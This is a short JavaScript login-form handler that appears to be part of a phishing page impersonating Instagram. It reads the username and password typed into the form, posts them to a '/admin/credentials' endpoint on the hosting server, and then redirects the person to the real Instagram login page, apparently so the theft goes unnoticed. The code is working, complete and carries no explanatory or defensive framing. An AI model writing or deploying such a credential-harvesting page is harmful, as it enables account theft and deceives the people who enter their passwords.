
document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  const inputs = this.querySelectorAll('input');
  const username = inputs[0].value;
  const password = inputs[1].value;
  
  try {
    const response = await fetch('/admin/credentials', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ username, password })
    });
    
    if (response.ok) {
      window.location.href = 'https://www.instagram.com/accounts/login/';
    } else {
      alert('Login failed');
    }
  } catch (error) {
    console.error('Error:', error);
    alert('An error occurred');
  }
});
